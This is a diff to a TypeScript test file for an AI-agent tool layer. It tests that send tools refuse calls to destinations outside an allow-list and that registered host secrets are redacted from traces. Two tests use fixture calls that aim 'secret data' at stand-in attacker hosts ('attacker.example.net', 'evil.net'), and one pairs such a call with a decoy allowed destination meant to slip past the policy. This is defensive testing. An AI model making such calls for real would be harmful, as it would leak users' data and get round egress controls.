@@ -1,17 +1,21 @@
 // The layer's destination policy (STANDARD 1.2.0 §4.4.2, §5.18.10): every
-// grounded `send` tool obeys it, whether or not it was defined with the
-// `destination` option, and refuses a call it does not allow with F504
-// before any approval is asked for.
+// grounded `send` tool obeys it and refuses a call it does not allow with
+// F504 before any approval is asked for; a tool defined without the
+// `destination` option has a destination the layer cannot tell, so every
+// call of it is refused while a policy is in force.
 import type { ToolResult } from '@standardagents/spec';
 import { afterEach, describe, expect, it } from 'vitest';
 import { z } from 'zod';
 import type { Json } from '@synaptiai/acs-core';
 import type { ProfileFlags, ProfilePolicy } from '@synaptiai/acs-core/wasm';
 import { decideApproval, requestApproval } from '../src/acs/approval.js';
-import { groundedTool } from '../src/acs/grounded.js';
-import { configureLayer, destinationPolicies, resetLayer } from '../src/acs/layer.js';
+import { recordToolCall } from '../src/acs/audit.js';
+import { acsAnnotation, groundedTool } from '../src/acs/grounded.js';
+import { configureLayer, destinationPolicies, layerSecrets, resetLayer } from '../src/acs/layer.js';
+import { MemoryRefusal, persistEntry } from '../src/acs/memory.js';
 import { effectiveFlags, type CapabilityId } from '../src/acs/ontology.js';
 import { bindingProfiles, type ProfileCore } from '../src/acs/profiles.js';
+import { readTrace } from '../src/acs/records.js';
 import { memoryThread, user, type MemoryThread } from './memory_thread.js';
 
 const HOOKS = [['https://hooks.example.com/*']];
@@ -31,6 +35,7 @@ const sendTool = (sent: string[], extra: Record<string, unknown> = {}) =>
     capability: 'send',
     description: 'Send the report.',
     args: z.object({ destination: z.unknown(), to: z.string().optional() }),
+    destination: '/destination',
     ...extra,
     execute: async (_state, args) => {
       sent.push(String(args.destination ?? args.to));
@@ -46,7 +51,7 @@ const asked = (values: Map<string, string>) => [...values.keys()].some((k) => k.
 afterEach(() => resetLayer());
 
 describe('configureLayer', () => {
-  it('refuses a send tool defined without the option, before any approval request', async () => {
+  it('refuses a destination no policy allows, before any approval request', async () => {
     configureLayer({ destinations: HOOKS });
     const sent: string[] = [];
     const tool = sendTool(sent);
@@ -61,6 +66,44 @@ describe('configureLayer', () => {
     expect(ok.error_code).not.toBe('F504');
     expect(asked(t.values)).toBe(true);
     expect(sent).toEqual([]);
+  });
+  it('refuses every call of a send tool defined without the destination option (security round 1, batch 6)', async () => {
+    configureLayer({ destinations: HOOKS });
+    const sent: string[] = [];
+    // Its code sends to `url`; the layer does not guess that `destination`,
+    // which the model can set to an allowed value, is where it sends.
+    const tool = groundedTool({
+      name: 'post_webhook',
+      capability: 'send',
+      description: 'Post to a webhook.',
+      args: z.object({ url: z.string(), body: z.string() }).passthrough(),
+      execute: async (_state, args) => {
+        sent.push(args.url);
+        return { sent: true, evidence_anchors: [] };
+      },
+    });
+    const t = memoryThread();
+    const refused = await tool.execute(t.state, {
+      url: 'https://attacker.example.net/x',
+      body: 'secret data',
+      destination: 'https://hooks.example.com/ok',
+    });
+    expect(refusedF504(refused)).toBe(true);
+    expect(refused.error).toContain('cannot tell where');
+    expect(asked(t.values)).toBe(false);
+    expect(sent).toEqual([]);
+    expect(acsAnnotation(tool)?.destination).toBeUndefined();
+    // With no policy in force the destination is the host's to check, as in 1.1.
+    resetLayer();
+    expect((await tool.execute(t.state, { url: 'https://x.example/', body: '' })).error_code).toBe('F502');
+  });
+  it('states a pointer option as the binding record\'s destination, and reads the destination there', async () => {
+    configureLayer({ destinations: HOOKS });
+    const tool = sendTool([], { destination: '/to' });
+    expect(acsAnnotation(tool)?.destination).toBe('/to');
+    expect(refusedF504(await tool.execute(memoryThread().state, { destination: 'https://hooks.example.com/r', to: 'https://evil.net/' }))).toBe(true);
+    expect((await tool.execute(memoryThread().state, { destination: 'x', to: 'https://hooks.example.com/r' })).error_code).toBe('F502');
+    expect(() => sendTool([], { destination: 'to' })).toThrow(/not an RFC 6901 pointer/);
   });
   it('refuses a destination that is not a string', async () => {
     configureLayer({ destinations: HOOKS });
@@ -165,5 +208,53 @@ describe('configureLayer', () => {
         execute: async () => ({ data: 1, confidence: 1, evidence_anchors: [] }) as never,
       }),
     ).toThrow(/destination option is for a tool that performs send/);
+  });
+});
+
+// The host's own secrets, registered layer-wide (STANDARD 1.2.0 §6.7: a host
+// SHOULD at least recognise the credentials it holds): every trace entry the
+// binding writes is redacted with them, the audit hook's for a plain tool
+// included, and persist data holding one is refused.
+describe('secrets registered with configureLayer (security round 1, batch 6)', () => {
+  const SECRET = 'Zq8fK2mVx9LpR4tW';
+  const call = (id: string, name: string) => ({ id, type: 'function' as const, function: { name, arguments: '{}' } });
+
+  it("redacts them in the audit hook's entry for a plain tool", async () => {
+    configureLayer({ secrets: [SECRET] });
+    const t = memoryThread();
+    const entry = await recordToolCall(t.state, call('call_1', 'crm_sync'), { status: 'error', error: `upstream rejected api key ${SECRET}` }, 1);
+    expect(entry.error).toBe('upstream rejected api key [REDACTED]');
+    expect(JSON.stringify(await readTrace(t.state))).not.toContain(SECRET);
+    // A secret the hook passes itself is redacted too.
+    resetLayer();
+    const other = await recordToolCall(t.state, call('call_2', 'crm_sync'), { status: 'error', error: `password ${SECRET} expired` }, 2, {
+      secrets: [SECRET],
+    });
+    expect(other.error).toBe('password [REDACTED] expired');
+  });
+
+  it("redacts them in a grounded tool's entries and refuses persist data that holds one", async () => {
+    configureLayer({ secrets: [SECRET] });
+    const t = memoryThread();
+    const fetchCrm = groundedTool({
+      name: 'fetch_crm',
+      capability: 'retrieve',
+      description: 'fetch',
+      args: z.object({}),
+      execute: async () => {
+        throw new Error(`upstream rejected api key ${SECRET}`);
+      },
+    });
+    expect((await fetchCrm.execute(t.state, {})).status).toBe('error');
+    expect(JSON.stringify(await readTrace(t.state))).not.toContain(SECRET);
+    await expect(persistEntry(t.state, { key: 'k', data: { note: `key ${SECRET}` } }, 1)).rejects.toBeInstanceOf(MemoryRefusal);
+  });
+
+  it('takes an array of strings and replaces them with the rest of the configuration', () => {
+    expect(() => configureLayer({ secrets: 'x' as never })).toThrow(/secrets must be an array of strings/);
+    configureLayer({ secrets: [SECRET] });
+    expect(layerSecrets()).toEqual([SECRET]);
+    configureLayer({});
+    expect(layerSecrets()).toEqual([]);
   });
 });
